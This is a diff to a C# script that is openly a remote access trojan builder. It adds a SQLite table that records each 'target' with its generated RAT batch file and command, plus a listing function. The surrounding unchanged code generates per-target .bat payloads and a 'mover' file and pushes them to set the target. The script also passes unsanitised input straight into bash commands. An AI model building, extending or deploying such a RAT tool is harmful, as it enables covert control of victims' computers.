@@ -2,6 +2,7 @@
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
+using Microsoft.Data.Sqlite;
 
 // CONFIG
 string mover_file = "mover.bat";
@@ -12,9 +13,52 @@ void shell_exec(string command) {
 	System.Diagnostics.Process.Start("/bin/bash", $"-c \"{command}\"");
 }
 
+void save_target(string target_name, string rat_file, string cmd_file) {
+	var connection = new SqliteConnection("Data Source=rat.db");
+	try {
+		
+		connection.Open();
+	} catch {
+		Console.WriteLine("\nError connecting with database\n");
+	}
+	
+	
+	// CREATES THE DAMN TARGETS TABLE IF TABLE DOESN'T EXIST 
+	var query = connection.CreateCommand();
+	
+	
+	        query.CommandText = "CREATE TABLE IF NOT EXISTS targets (id INTEGER PRIMARY KEY AUTOINCREMENT,target_name TEXT,rat_file TEXT,cmd_file TEXT)";
+        query.ExecuteNonQuery();
+        
+        // TO INSERT THE DAMN TARGET RECORDS TO THE TARGETS TABLE 0_0
+        var query1 = connection.CreateCommand();
+        query1.CommandText = "INSERT INTO targets (target_name, rat_file, cmd_file) VALUES (@target_name, @rat_file, @cmd_file)";
+query1.Parameters.AddWithValue("@target_name", target_name);
+query1.Parameters.AddWithValue("@rat_file", rat_file);
+query1.Parameters.AddWithValue("@cmd_file", cmd_file);
+        query1.ExecuteNonQuery();
+}
+
+void view_targets() {
+	var connection = new SqliteConnection("Data Source=rat.db");
+        connection.Open();
+        var select = connection.CreateCommand();
+        select.CommandText = "SELECT * FROM targets";
+        var reader = select.ExecuteReader();
+
+        while(reader.Read())
+        {
+	    Console.WriteLine(reader["id"] + "    " + reader["target_name"] + "       " + reader["rat_file"] + "       " + reader["cmd_file"]); 
+            Console.WriteLine("-------------------");
+        }
+
+        reader.Close();
+        connection.Close();
+}
+
 void generate_rat(string target, string file, string command) {
 	// CREATE A DIRECTORY FOR THE TARGET
-	System.Diagnostics.Process.Start("/bin/bash", $"-c \"mkdir {target}\""); // CREATES DIR FOR THE TARGET
+	shell_exec($"mkdir {target}"); // CREATES DIR FOR THE TARGET
 	Thread.Sleep(3);
 	System.Diagnostics.Process.Start("/bin/bash", $"-c \"touch {target}/{file}.bat\""); // CREATES EMPTY BATCH FILE
 	Thread.Sleep(3);
@@ -79,11 +123,13 @@ while (true) {
 	generate_rat(target_name, file, cmd);
 	// GENERATES THE MOVER FILE
 	generate_mover(file, target_name);
+	// SAVES TARGETS INFO IN DB
+	save_target(target_name, file, cmd); 
 	// SAVES CHANGES AND SET THE TARGET
 	push_changes();
 	
     } else if (opn == "2") {
-    	shell_exec("ls");
+    	view_targets();
 
     } else if (opn == "3") {
 
